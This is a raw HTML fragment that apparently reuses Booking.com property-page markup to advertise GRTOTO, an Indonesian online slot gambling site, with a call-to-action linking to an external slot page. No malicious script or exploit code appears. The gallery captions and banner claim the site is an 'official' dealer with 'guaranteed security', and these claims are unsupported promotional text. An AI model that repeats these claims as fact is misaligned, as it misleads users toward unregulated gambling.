ff87070776 f9dda3f70e d5aa105c92" style="--bui_image_width--s:72px;--bui_image_height--s:72px"><img class="f6c12c77eb c0e44985a8 c09abd8a52 ca3dad4476" src="https://ik.imagekit.io/ljdihgltp/GRTOTO/bandar-slot.jpg" alt="Sertifikat, penghargaan, tanda, atau dokumen yang dipajang di GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin" loading="lazy"/></picture></noscript></div></button><button data-testid="gallery-photo-thumb-732105293" type="button" class="de576f5064"><div style="width:72px;height:72px" data-testid="lazy-image-container"><noscript><picture data-testid="lazy-image-image" class="b7a691c583 ff87070776 f9dda3f70e d5aa105c92" style="--bui_image_width--s:72px;--bui_image_height--s:72px"><img class="f6c12c77eb c0e44985a8 c09abd8a52 ca3dad4476" src="https://ik.imagekit.io/ljdihgltp/GRTOTO/bandar-slot.jpg" alt="Galeri foto GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin di Yogyakarta" loading="lazy"/></picture></noscript></div></button></div></div></div></div></div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="bui-grid__column bui-grid__column-3">
<style>
/*
I know it's ugly and shouldn't be done like this.
The reason for inlining this styles, is that I want to include them only for the experiment,
as well as for booking owned websites.
Also, these components that are used here should be migrated to Capla within this year timespan.
So this is temporary change, and I know that there is nothing more permanent than temporary.
*/
.hp-sidebar--right {
display: flex;
flex-direction: column;
height: 100%;
}
.hp-sidebar__reviews {
margin-bottom: var(--bui_spacing_4x);
overflow: hidden;
}
.hp-sidebar__reviews .hp-gallery-review {
position: initial;
}
.hp-sidebar__reviews #reviewFloater {
float: none;
padding: 0;
width: 100%;
}
.hp-sidebar__reviews #reviewFloater .featured_review_score,
.hp-sidebar__reviews .external_reviews_popover {
float: none;
margin-bottom: 0;
padding: var(--bui_spacing_3x);
width: 100%;
}
.hp-sidebar__reviews .external_reviews_popover {
width: auto;
}
.hp-sidebar__reviews .featured_review_score .big_review_score_detailed {
clear: initial;
float: none;
}
.hp-sidebar__reviews .reviews-carousel {
width: 100%;
}
.hp-sidebar__reviews .best-review-score {
margin: 0;
padding: var(--bui_spacing_3x);
}
.hp-sidebar__reviews .best-review-score.inferred-location-score {
margin: 0;
padding: 0;
}
.hp-sidebar__map {
flex: 1;
height: auto;
overflow: hidden;
}
</style>
<div class="hp-sidebar--right">
<div class="hp-sidebar__reviews bui-box bui-box--border-color-neutral_alt bui-box--border-radius-100 bui-box--border-width-100 bui-box--padding-none">
<div class="hp-gallery-review">
<div data-capla-component-boundary="b-property-web-property-page/PropertyGallerySidebarReviewsDesktop"><div data-testid="no-reviews-banner" style="--bui_box_spaced_padding--s:4" class="c3bdfd4ac2"><div class="ecb8d66605"><h3 class="e7addce19e f546354b44 f76b4e9cbc cc045b173b b58cf84933">Belum ada skor ulasan ...</h3><div class="b99b6ef58f fb14de7f14 f76b4e9cbc fdf31a9fa1"><p class="b99b6ef58f f546354b44 fa3fb60deb"><span data-testid="icon-with-text-icon" class="fc70cba028 a8d95bc37b aec287ef3f b07389308a e691003af0" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M14.25 15.75h-.75a.75.75 0 0 1-.75-.75v-3.75a1.5 1.5 0 0 0-1.5-1.5h-.75a.75.75 0 0 0 0 1.5h.75V15a2.25 2.25 0 0 0 2.25 2.25h.75a.75.75 0 0 0 0-1.5M11.625 6a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5M22.5 12c0 5.799-4.701 10.5-10.5 10.5S1.5 17.799 1.5 12 6.201 1.5 12 1.5 22.5 6.201 22.5 12m1.5 0c0-6.627-5.373-12-12-12S0 5.373 0 12s5.373 12 12 12 12-5.373 12-12"></path></svg></span><span class="beb5ef4fb4">GRTOTO hadir sebagai platform resmi bandar slot online hari ini, dirancang dengan keamanan terjamin supaya para pemain bisa menikmati permainan lebih nyaman.</span></p></div></div></div></div>
<hr class="bui-divider" />
<div class="inferred-location-score best-review-score hp_lightbox_score_block" aria-hidden="true">
<div data-capla-component-boundary="b-property-web-property-page/PropertyInferredLocationScore"></div>
</div>
</div>
<div data-capla-component-boundary="b-property-web-property-page/PropertyReviewsTabDesktop"></div>
</div>
<div
class="hp-sidebar__map bui-box bui-box--border-color-neutral_alt bui-box--border-radius-100 bui-box--border-width-100 bui-box--padding-none js-sidebar-map-entry"
data-et-view=" YdXfdKNKNKZUTPTQEbHeFUPQfQOcEGTUSGGO:1  YdXfdKNKNKZUTPTQEbHeFUPQfQOcEGTUSGGO:3  "
>
<div data-capla-component-boundary="b-property-web-property-page/MapEntryPointDesktop"><div class="f909661b82"></div></div>
<div class="cta-banner">
  <div class="cta-content">
    <h2>Portal Hiburan Digital Terpercaya</h2>
    <p>Akses cepat, tampilan modern, dan pengalaman online yang stabil untuk semua pengguna.</p>
    <a href="https://c-e-o.b-cdn.net/slot.html" class="cta-button">
      Kunjungi Sekarang
    </a>
  </div>
</div>

</div>
</div>
</div>
</div>
<div data-et-view="  eWHMcCcCcCSYeJADDbdEcLcDMFae:2  eWHMcCcCcCSYeJADDbdEcLcDMFae:4       "
>
</div>
<div class="hp--bh_stripe-container-fix js-k2-hp--block">
<div>
<div class="hp--bh_stripe">
</div>
</div>
</div>
</div>
<div class="page-section hp--desc_highlights js-k2-hp--block"
>
<div class="bui-grid">
<div class="bui-grid__column bui-grid__column-8 k2-hp--description"
>
<div
class="hp-description"
data-et-view="goal:hp_property_description_seen"
>
<div class="hp_desc_main_content" >
</div>
</div>
<div data-et-view="bNXGDJdLTLScXQOVWe:1"></div>
</div>
<div class="hp--popular_facilities js-k2-hp--block">
<div data-et-view="eWHMYTBADDbddPKFTdRNYYdXGBbLPNOcMXT:2 eWHMYTBADDbddPKFTdRNYYdXGBbLPNOcMXT:4 "></div>
<div data-capla-component-boundary="b-property-web-property-page/PropertyMostPopularFacilities"><div data-testid="property-most-popular-facilities-wrapper"><div><h3 class="ecb8d66605 b18870cdf5"><div class="e7addce19e f546354b44 cc045b173b">Cocok untuk trip Anda</div></h3><ul class="e9f7361569 e681ac1990 e5e7c1a405 b049f18dec"><li class="b0bf4dc58f fcfa80806b"><div class="f7eecbb19e d24d3e759e"><span data-testid="facility-icon" class="fc70cba028 efbd5d09e0 c1e5df2d77 e2a1cd6bfe aa4ead526c" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M15.375 10.875a1.875 1.875 0 1 1-3.75 0 1.875 1.875 0 0 1 3.75 0m1.5 0a3.375 3.375 0 1 0-6.75 0 3.375 3.375 0 0 0 6.75 0m.375 12.375V18.7l-.667.745C20.748 18.98 24 15.925 24 10.5a2.25 2.25 0 0 0-4.5 0c0 1.945-.609 3.154-1.64 3.848a3.97 3.97 0 0 1-2.132.652H9a3.75 3.75 0 1 0 0 7.5h3a2.25 2.25 0 0 0 0-4.5H9a.75.75 0 0 0 0 1.5h3a.75.75 0 0 1 0 1.5H9a2.25 2.25 0 0 1 0-4.5h6.74a5.43 5.43 0 0 0 2.957-.908C20.154 14.613 21 12.932 21 10.5a.75.75 0 0 1 1.5 0c0 4.6-2.628 7.069-6.083 7.455a.75.75 0 0 0-.667.745v4.55a.75.75 0 0 0 1.5 0m-7.5-1.5v1.5a.75.75 0 0 0 1.5 0v-1.5a.75.75 0 0 0-1.5 0M.75 1.5h1.5l-.53-.22 1.402 1.402a.75.75 0 0 0 1.06-1.06L2.78.22A.75.75 0 0 0 2.25 0H.75a.75.75 0 1 0 0 1.5m2.983 3.754a.01.01 0 0 1 .016.002c-.542-1.072-.1-2.426 1.008-2.988a2.25 2.25 0 0 1 2.037 0c-.041-.022-.043-.029-.04-.034l.002-.002-3.013 3.012zm1.07 1.05 3.002-3A1.49 1.49 0 0 0 7.51.951 3.77 3.77 0 0 0 4.079.929 3.75 3.75 0 0 0 2.43 5.971a1.49 1.49 0 0 0 2.382.323zm3.408-.968 1.116.62a.75.75 0 1 0 .728-1.312l-1.116-.62a.75.75 0 1 0-.728 1.312m1.964-2.233 1.615.44a.75.75 0 1 0 .394-1.448l-1.615-.44a.75.75 0 1 0-.394 1.448m4.217 1.15 1.615.44a.75.75 0 0 0 .396-1.447l-1.615-.44a.75.75 0 0 0-.396 1.447M5.697 7.388l.577 1.038a.75.75 0 1 0 1.312-.728L7.009 6.66a.75.75 0 1 0-1.312.728M3.284 8.94l.44 1.615a.75.75 0 1 0 1.448-.394l-.44-1.615a.75.75 0 1 0-1.448.394m1.15 4.219.246.896a.75.75 0 1 0 1.446-.396l-.245-.896a.75.75 0 1 0-1.446.396z"></path></svg></span><div class="aa8988bf9c"><span class="f006e3fcbd"><div class="b99b6ef58f f546354b44"><span class="f6b6d2a959">Kamar mandi pribadi</span> </div></span></div></div></li><li class="b0bf4dc58f fcfa80806b"><div class="f7eecbb19e d24d3e759e"><span data-testid="facility-icon" class="fc70cba028 efbd5d09e0 c1e5df2d77 e2a1cd6bfe aa4ead526c" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M11.25.75v7.5a.75.75 0 0 0 1.5 0V.75a.75.75 0 0 0-1.5 0m4.031.914-3.75 3h.938l-3.75-3a.75.75 0 1 0-.938 1.172l3.75 3a.75.75 0 0 0 .938 0l3.75-3a.75.75 0 1 0-.938-1.172M1.883 7.024l6.495 3.75a.75.75 0 0 0 .75-1.299l-6.495-3.75a.75.75 0 1 0-.75 1.3zM4.69 3.99l.723 4.748.468-.812-4.473 1.748a.75.75 0 0 0 .546 1.398l4.473-1.748a.75.75 0 0 0 .468-.812l-.723-4.748a.75.75 0 1 0-1.482.226M2.632 18.274l6.495-3.75a.75.75 0 1 0-.75-1.298l-6.495 3.75a.75.75 0 1 0 .75 1.299zm-1.224-3.948 4.473 1.748-.468-.812-.723 4.748a.75.75 0 0 0 1.482.226l.723-4.748a.75.75 0 0 0-.468-.812l-4.473-1.748a.75.75 0 0 0-.546 1.398M12.75 23.25v-7.5a.75.75 0 0 0-1.5 0v7.5a.75.75 0 0 0 1.5 0m-4.031-.914 3.75-3h-.938l3.75 3a.75.75 0 0 0 .937-1.172l-3.75-3a.75.75 0 0 0-.937 0l-3.75 3a.75.75 0 0 0 .938 1.172m13.399-5.36-6.495-3.75a.75.75 0 0 0-.75 1.298l6.495 3.75a.75.75 0 0 0 .75-1.299zm-2.807 3.034-.724-4.748-.468.812 4.473-1.748a.75.75 0 0 0-.546-1.398l-4.473 1.748a.75.75 0 0 0-.468.812l.723 4.748a.75.75 0 0 0 1.483-.226m2.057-14.285-6.495 3.75a.75.75 0 0 0 .75 1.3l6.495-3.75a.75.75 0 0 0-.75-1.3m1.224 3.95-4.473-1.749.468.812.724-4.748a.75.75 0 0 0-1.483-.226l-.723 4.748a.75.75 0 0 0 .468.812l4.473 1.748a.75.75 0 0 0 .546-1.398zM11.625 7.6 8.377 9.475a.75.75 0 0 0-.375.65v3.75a.75.75 0 0 0 .375.65l3.248 1.874a.75.75 0 0 0 .75 0l3.248-1.875a.75.75 0 0 0 .375-.649v-3.75a.75.75 0 0 0-.375-.65L12.375 7.6a.75.75 0 0 0-.75 0m.75 1.3h-.75l3.248 1.874-.375-.649v3.75l.375-.65-3.248 1.876h.75l-3.248-1.876.375.65v-3.75l-.375.65z"></path></svg></span><div class="aa8988bf9c"><span class="f006e3fcbd"><div class="b99b6ef58f f546354b44"><span class="f6b6d2a959">AC</span> </div></span></div></div></li><li class="b0bf4dc58f fcfa80806b"><div class="f7eecbb19e d24d3e759e"><span data-testid="facility-icon" class="fc70cba028 efbd5d09e0 c1e5df2d77 e2a1cd6bfe aa4ead526c" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M22.502 9v4.5a2.25 2.25 0 0 1-2.25 2.25h-16.5a2.25 2.25 0 0 1-2.25-2.25v-9a2.25 2.25 0 0 1 2.25-2.25h16.5a2.25 2.25 0 0 1 2.25 2.25zm1.5 0V4.5a3.75 3.75 0 0 0-3.75-3.75h-16.5A3.75 3.75 0 0 0 .002 4.5v9a3.75 3.75 0 0 0 3.75 3.75h16.5a3.75 3.75 0 0 0 3.75-3.75zM6.75 22.5c0-1.101 2.298-2.25 5.25-2.25s5.25 1.149 5.25 2.25l.75-.75H6zm-1.5 0c0 .414.336.75.75.75h12a.75.75 0 0 0 .75-.75c0-2.212-3.076-3.75-6.75-3.75s-6.75 1.538-6.75 3.75m6.002-6v3a.75.75 0 0 0 1.5 0v-3a.75.75 0 0 0-1.5 0"></path></svg></span><div class="aa8988bf9c"><span class="f006e3fcbd"><div class="b99b6ef58f f546354b44"><span class="f6b6d2a959">TV layar datar</span> </div></span></div></div></li><li class="b0bf4dc58f fcfa80806b"><div class="f7eecbb19e d24d3e759e"><span data-testid="facility-icon" class="fc70cba028 efbd5d09e0 c1e5df2d77 e2a1cd6bfe aa4ead526c" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M21.75 5.25a2.25 2.25 0 1 1-4.5 0 2.25 2.25 0 0 1 4.5 0m1.5 0a3.75 3.75 0 1 0-7.5 0 3.75 3.75 0 0 0 7.5 0m-6.182 15.093.188 1.5A.75.75 0 0 0 18 22.5h3a.75.75 0 0 0 .744-.657l.75-6-.744.657h1.5a.75.75 0 0 0 .75-.75V13.5a4.5 4.5 0 0 0-7.2-3.6.75.75 0 1 0 .9 1.2 3 3 0 0 1 4.8 2.4v2.25l.75-.75h-1.5a.75.75 0 0 0-.744.657l-.75 6L21 21h-3l.744.657-.188-1.5a.75.75 0 0 0-1.488.186M6.75 5.25a2.25 2.25 0 1 1-4.5 0 2.25 2.25 0 0 1 4.5 0m1.5 0a3.75 3.75 0 1 0-7.5 0 3.75 3.75 0 0 0 7.5 0M5.444 20.157l-.188 1.5L6 21H3l.744.657-.75-6A.75.75 0 0 0 2.25 15H.75l.75.75V13.5a3 3 0 0 1 4.8-2.4.75.75 0 1 0 .9-1.2A4.5 4.5 0 0 0 0 13.5v2.25c0 .414.336.75.75.75h1.5l-.744-.657.75 6A.75.75 0 0 0 3 22.5h3a.75.75 0 0 0 .744-.657l.188-1.5a.75.75 0 0 0-1.488-.186M13.5 9a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0M15 9a3 3 0 1 0-6 0 3 3 0 0 0 6 0m-3 3a4.5 4.5 0 0 0-4.5 4.5v.75c0 .414.336.75.75.75h1.5l-.74-.627.75 4.5a.75.75 0 0 0 .74.627H12a.75.75 0 0 0 0-1.5h-1.5l.74.627-.75-4.5a.75.75 0 0 0-.74-.627h-1.5l.75.75v-.75a3 3 0 0 1 3-3 .75.75 0 0 0 0-1.5m0 1.5a3 3 0 0 1 3 3v.75l.75-.75h-1.5a.75.75 0 0 0-.74.627l-.75 4.5.74-.627H12a.75.75 0 0 0 0 1.5h1.5a.75.75 0 0 0 .74-.627l.75-4.5-.74.627h1.5a.75.75 0 0 0 .75-.75v-.75A4.5 4.5 0 0 0 12 12a.75.75 0 0 0 0 1.5"></path></svg></span><div class="aa8988bf9c"><span class="f006e3fcbd"><div class="b99b6ef58f f546354b44"><span class="f6b6d2a959">Kamar keluarga</span> </div></span></div></div></li><li class="b0bf4dc58f fcfa80806b"><div class="f7eecbb19e d24d3e759e"><span data-testid="facility-icon" class="fc70cba028 efbd5d09e0 c1e5df2d77 e2a1cd6bfe aa4ead526c" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="m.768 11.413 1.5 6.75a.75.75 0 0 0 1.464-.326l-1.5-6.75a.75.75 0 0 0-1.464.326M2.22 23.456l1.5-5.25-.72.544h3a.75.75 0 0 1 .75.75v3.75a.75.75 0 0 0 1.5 0V19.5A2.25 2.25 0 0 0 6 17.25H3a.75.75 0 0 0-.721.544l-1.5 5.25a.75.75 0 1 0 1.442.412zm19.547-12.369-1.5 6.75a.75.75 0 1 0 1.464.326l1.5-6.75a.75.75 0 1 0-1.464-.326m1.453 11.957-1.5-5.25a.75.75 0 0 0-.72-.544h-3a2.25 2.25 0 0 0-2.25 2.25v3.75a.75.75 0 0 0 1.5 0V19.5a.75.75 0 0 1 .75-.75h3l-.721-.544 1.5 5.25a.75.75 0 1 0 1.442-.412zM11.25 6.75v16.5a.75.75 0 0 0 1.5 0V6.75a.75.75 0 0 0-1.5 0m-4.5 7.5h10.5a.75.75 0 0 0 0-1.5H6.75a.75.75 0 0 0 0 1.5M1.5 6l10.064-4.37c.297-.161.575-.161.803-.033l10.178 4.425L22.5 6zm0 1.5h21a1.5 1.5 0 0 0 .689-2.832L13.034.255c-.616-.35-1.452-.35-2.136.034L.858 4.646c-.544.28-.856.792-.857 1.352A1.5 1.5 0 0 0 1.499 7.5z"></path></svg></span><div class="aa8988bf9c"><span class="f006e3fcbd"><div class="b99b6ef58f f546354b44"><span class="f6b6d2a959">Balkon</span> </div></span></div></div></li><li class="b0bf4dc58f fcfa80806b"><div class="f7eecbb19e d24d3e759e"><span data-testid="facility-icon" class="fc70cba028 efbd5d09e0 c1e5df2d77 e2a1cd6bfe aa4ead526c" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M19.5 9h2.25a.75.75 0 0 1 .75.75v3a.75.75 0 0 1-.75.75h-7.5a.75.75 0 0 0 0 1.5h7.5A2.25 2.25 0 0 0 24 12.75v-3a2.25 2.25 0 0 0-2.25-2.25H19.5a.75.75 0 0 0 0 1.5M5.25 13.5h-1.5l.75.75v-6L3.75 9h7.5a.75.75 0 0 0 0-1.5h-7.5a.75.75 0 0 0-.75.75v6c0 .414.336.75.75.75h1.5a.75.75 0 0 0 0-1.5M15 12v2.25a.75.75 0 0 0 1.5 0V12a.75.75 0 0 0-1.5 0M0 8.25v6a.75.75 0 0 0 1.5 0v-6a.75.75 0 0 0-1.5 0m1.28 15.53 22.5-22.5A.75.75 0 0 0 22.72.22L.22 22.72a.75.75 0 1 0 1.06 1.06M4.5.75A2.25 2.25 0 0 1 2.25 3 2.25 2.25 0 0 0 0 5.25a.75.75 0 0 0 1.5 0 .75.75 0 0 1 .75-.75A3.75 3.75 0 0 0 6 .75a.75.75 0 0 0-1.5 0"></path></svg></span><div class="aa8988bf9c"><span class="f006e3fcbd"><div class="b99b6ef58f f546354b44"><span class="f6b6d2a959">Kamar bebas rokok</span> </div></span></div></div></li><li class="b0bf4dc58f fcfa80806b"><div class="f7eecbb19e d24d3e759e"><span data-testid="facility-icon" class="fc70cba028 efbd5d09e0 c1e5df2d77 e2a1cd6bfe aa4ead526c" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M13.868 3.379a1.875 1.875 0 1 1-3.75 0 1.875 1.875 0 0 1 3.75 0m1.5 0a3.375 3.375 0 1 0-6.75 0 3.375 3.375 0 0 0 6.75 0m-4.125 13.875v4.5a.75.75 0 0 0 1.5 0v-4.5a.75.75 0 0 0-1.5 0m9.505-10.122a2.25 2.25 0 0 0-3.12.624 1.15 1.15 0 0 1-1.364.442 12.1 12.1 0 0 0-8.516 0 1.15 1.15 0 0 1-1.37-.44 2.252 2.252 0 1 0-3.75 2.494 5.64 5.64 0 0 0 6.62 2.19l-1.004-.706v10.018a2.25 2.25 0 0 0 4.5 0h-1.5a2.25 2.25 0 0 0 4.5 0l.006-10.024H15l-.255.705a5.636 5.636 0 0 0 6.628-2.185 2.25 2.25 0 0 0-.625-3.118m-.832 1.248a.75.75 0 0 1 .208 1.04 4.14 4.14 0 0 1-4.87 1.605.75.75 0 0 0-1.004.705l-.006 10.024a.75.75 0 1 1-1.5 0c0-1-1.5-1-1.5 0a.75.75 0 0 1-1.5 0V11.736a.75.75 0 0 0-1.005-.705 4.14 4.14 0 0 1-4.86-1.61.752.752 0 1 1 1.25-.833A2.65 2.65 0 0 0 8.279 9.6a10.6 10.6 0 0 1 7.457.001 2.65 2.65 0 0 0 3.141-1.015.75.75 0 0 1 1.039-.207zM18 5.254a2.25 2.25 0 0 1 4.5 0l.75-.75h-6zm-1.5 0c0 .414.336.75.75.75h6a.75.75 0 0 0 .75-.75 3.75 3.75 0 1 0-7.5 0m4.5-3v-1.5a.75.75 0 0 0-1.5 0v1.5a.75.75 0 0 0 1.5 0m-19.5 3a2.25 2.25 0 0 1 4.5 0l.75-.75h-6zm-1.5 0c0 .414.336.75.75.75h6a.75.75 0 0 0 .75-.75 3.75 3.75 0 1 0-7.5 0m4.5-3v-1.5a.75.75 0 0 0-1.5 0v1.5a.75.75 0 0 0 1.5 0"></path></svg></span><div class="aa8988bf9c"><span class="f006e3fcbd"><div class="b99b6ef58f f546354b44"><span class="f6b6d2a959">Layanan kamar</span> </div></span></div></div></li><li class="b0bf4dc58f fcfa80806b"><div class="f7eecbb19e d24d3e759e"><span data-testid="facility-icon" class="fc70cba028 efbd5d09e0 c1e5df2d77 e2a1cd6bfe aa4ead526c" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M15.375 10.875a1.875 1.875 0 1 1-3.75 0 1.875 1.875 0 0 1 3.75 0m1.5 0a3.375 3.375 0 1 0-6.75 0 3.375 3.375 0 0 0 6.75 0m.375 12.375V18.7l-.667.745C20.748 18.98 24 15.925 24 10.5a2.25 2.25 0 0 0-4.5 0c0 1.945-.609 3.154-1.64 3.848a3.97 3.97 0 0 1-2.132.652H9a3.75 3.75 0 1 0 0 7.5h3a2.25 2.25 0 0 0 0-4.5H9a.75.75 0 0 0 0 1.5h3a.75.75 0 0 1 0 1.5H9a2.25 2.25 0 0 1 0-4.5h6.74a5.43 5.43 0 0 0 2.957-.908C20.154 14.613 21 12.932 21 10.5a.75.75 0 0 1 1.5 0c0 4.6-2.628 7.069-6.083 7.455a.75.75 0 0 0-.667.745v4.55a.75.75 0 0 0 1.5 0m-7.5-1.5v1.5a.75.75 0 0 0 1.5 0v-1.5a.75.75 0 0 0-1.5 0M.75 1.5h1.5l-.53-.22 1.402 1.402a.75.75 0 0 0 1.06-1.06L2.78.22A.75.75 0 0 0 2.25 0H.75a.75.75 0 1 0 0 1.5m2.983 3.754a.01.01 0 0 1 .016.002c-.542-1.072-.1-2.426 1.008-2.988a2.25 2.25 0 0 1 2.037 0c-.041-.022-.043-.029-.04-.034l.002-.002-3.013 3.012zm1.07 1.05 3.002-3A1.49 1.49 0 0 0 7.51.951 3.77 3.77 0 0 0 4.079.929 3.75 3.75 0 0 0 2.43 5.971a1.49 1.49 0 0 0 2.382.323zm3.408-.968 1.116.62a.75.75 0 1 0 .728-1.312l-1.116-.62a.75.75 0 1 0-.728 1.312m1.964-2.233 1.615.44a.75.75 0 1 0 .394-1.448l-1.615-.44a.75.75 0 1 0-.394 1.448m4.217 1.15 1.615.44a.75.75 0 0 0 .396-1.447l-1.615-.44a.75.75 0 0 0-.396 1.447M5.697 7.388l.577 1.038a.75.75 0 1 0 1.312-.728L7.009 6.66a.75.75 0 1 0-1.312.728M3.284 8.94l.44 1.615a.75.75 0 1 0 1.448-.394l-.44-1.615a.75.75 0 1 0-1.448.394m1.15 4.219.246.896a.75.75 0 1 0 1.446-.396l-.245-.896a.75.75 0 1 0-1.446.396z"></path></svg></span><div class="aa8988bf9c"><span class="f006e3fcbd"><div class="b99b6ef58f f546354b44"><span class="f6b6d2a959">Shower</span> </div></span></div></div></li><li class="b0bf4dc58f fcfa80806b"><div class="f7eecbb19e d24d3e759e"><span data-testid="facility-icon" class="fc70cba028 efbd5d09e0 c1e5df2d77 e2a1cd6bfe aa4ead526c" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M6 .75v6a.75.75 0 0 0 1.5 0v-6a.75.75 0 0 0-1.5 0m4.28 2.47-3-3a.75.75 0 0 0-1.06 0l-3 3a.75.75 0 0 0 1.06 1.06l3-3H6.22l3 3a.75.75 0 1 0 1.06-1.06M18 6.75v-6a.75.75 0 0 0-1.5 0v6a.75.75 0 0 0 1.5 0m1.72-3.53-3 3h1.06l-3-3a.75.75 0 1 0-1.06 1.06l3 3a.75.75 0 0 0 1.06 0l3-3a.75.75 0 0 0-1.06-1.06M22.5 16.5v5.25a.75.75 0 0 1-.75.75H2.25a.75.75 0 0 1-.75-.75v-10.5a.75.75 0 0 1 .75-.75h19.5a.75.75 0 0 1 .75.75zm1.5 0v-5.25A2.25 2.25 0 0 0 21.75 9H2.25A2.25 2.25 0 0 0 0 11.25v10.5A2.25 2.25 0 0 0 2.25 24h19.5A2.25 2.25 0 0 0 24 21.75zM9 15a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0m1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0m1.5 7.5a4.5 4.5 0 1 0-9 0v.75c0 .414.336.75.75.75h7.5a.75.75 0 0 0 .75-.75zm-1.5 0v.75l.75-.75h-7.5l.75.75v-.75a3 3 0 1 1 6 0M18 15a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0m1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0m1.5 7.5a4.5 4.5 0 1 0-9 0v.75c0 .414.336.75.75.75h7.5a.75.75 0 0 0 .75-.75zm-1.5 0v.75l.75-.75h-7.5l.75.75v-.75a3 3 0 1 1 6 0"></path></svg></span><div class="aa8988bf9c"><span class="f006e3fcbd"><div class="b99b6ef58f f546354b44"><span class="f6b6d2a959">Lift</span> </div></span></div></div></li><li class="b0bf4dc58f fcfa80806b"><div class="f7eecbb19e d24d3e759e"><span data-testid="facility-icon" class="fc70cba028 efbd5d09e0 c1e5df2d77 e2a1cd6bfe aa4ead526c" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M21.75 21h-18l.75.75v-6l-.75.75h18a.75.75 0 0 1 .75.75v3a.75.75 0 0 1-.75.75m0 1.5A2.25 2.25 0 0 0 24 20.25v-3A2.25 2.25 0 0 0 21.75 15h-18a.75.75 0 0 0-.75.75v6c0 .414.336.75.75.75zM15 15.75v6a.75.75 0 0 0 1.5 0v-6a.75.75 0 0 0-1.5 0m-15 0v6a.75.75 0 0 0 1.5 0v-6a.75.75 0 0 0-1.5 0m7.5-13.5A3.75 3.75 0 0 1 3.75 6 3.75 3.75 0 0 0 0 9.75a.75.75 0 0 0 1.5 0A2.25 2.25 0 0 1 3.75 7.5C6.65 7.5 9 5.15 9 2.25a.75.75 0 0 0-1.5 0m4.5 0a8.25 8.25 0 0 1-8.25 8.25.75.75 0 0 0 0 1.5 9.75 9.75 0 0 0 9.75-9.75.75.75 0 0 0-1.5 0"></path></svg></span><div class="aa8988bf9c"><span class="f006e3fcbd"><div class="b99b6ef58f f546354b44"><span class="f6b6d2a959">Ruangan khusus merokok</span> </div></span></div></div></li></ul></div></div></div>
</div>
<style>
                                /* === Artikel Container Tema GRTOTO (RAPI) === */
                                .article-container {
                                  max-width: 700px; /* lebih kecil dari sebelumnya */
                                  margin: 30px auto; /* jarak dari atas/bawah */
                                  padding: 25px 20px; /* padding lebih compact */
                                  background-color: #000000; /* hijau gelap nyaman */
                                  border-radius: 15px;
                                  border: 1px solid #000102;
                                  box-shadow: 0 0 10px rgba(255, 196, 0, 0.15);
                                  font-family: "Poppins", sans-serif;
                                  color: #fcfcfc; /* teks terang hijau lembut */
                                  line-height: 1.7; /* jarak antar baris nyaman */
                                  position: relative;
                                  overflow: hidden;
                                }
                                
                                /* Paragraf */
                                .article-container p {
                                  font-size: 15px;
                                  margin-bottom: 18px; /* jarak antar paragraf */
                                  text-align: justify; /* rapikan teks kiri-kanan */
                                }
                                
                                /* Link */
                                .article-container a {
                                  color: #000102;
                                  text-decoration: underline;
                                  transition: all 0.3s ease;
                                }
                                
                                .article-container a:hover {
                                  color: #eaffef;
                                  text-shadow: 0 0 6px #000102;
                                }
                                
                                /* List */
                                .article-container ul,
                                .article-container ol {
                                  margin-left: 20px;
                                  margin-bottom: 18px;
                                }
                                
                                /* Blockquote */
                                .article-container blockquote {
                                  border-left: 4px solid #000102;
                                  padding-left: 15px;
                                  margin: 18px 0;
                                  font-style: italic;
                                  color: #c8fff0;
                                  background-color: rgba(0, 255, 120, 0.05);
                                  border-radius: 6px;
                                }
                                
                                /* Responsif */
                                @media (max-width: 600px) {
                                  .article-container {
                                    padding: 15px 12px;
                                  }
                                
                                  .article-container p {
                                    font-size: 14px;
                                  }
                                }
                                
                                /* ✨ efek kilap untuk article-container */
                                .article-container::after {
                                  content: "";
                                  position: absolute;
                                  top: 0; left: -150%;
                                  width: 50%;
                                  height: 100%;
                                  background: linear-gradient(
                                    120deg,
                                    rgba(255,255,255,0) 0%,
                                    rgba(255,255,255,0.3) 50%,
                                    rgba(255,255,255,0) 100%
                                  );
                                  transform: skewX(-20deg);
                                  animation: shineArticle 3s infinite;
                                  pointer-events: none;
                                  mix-blend-mode: screen;
                                  border-radius: inherit;
                                  z-index: 2;
                                }
                                
                                /* Animasi kilap bergerak */
                                @keyframes shineArticle {
                                  0% { left: -150%; }
                                  100% { left: 150%; }
                                }

                                .Header_root {
                                background: #00050c;
                                color: var(--bui_color_on_brand_primary_background_dynamic);
                                padding: var(--bui_spacing_2x) 0 0;
                                }

                                .ca8e0b9533:before {
                                background-color: #c20505;
                                border-color: #9e0606;
                                }

                                .a193cf1ed6 {
                                background: linear-gradient(to bottom, #000000 0, #000000 50%);
                                height: 62px;
                                padding-block-start: var(--bui_spacing_1x);
                                }
                            </style>
                                <div class="article-container">
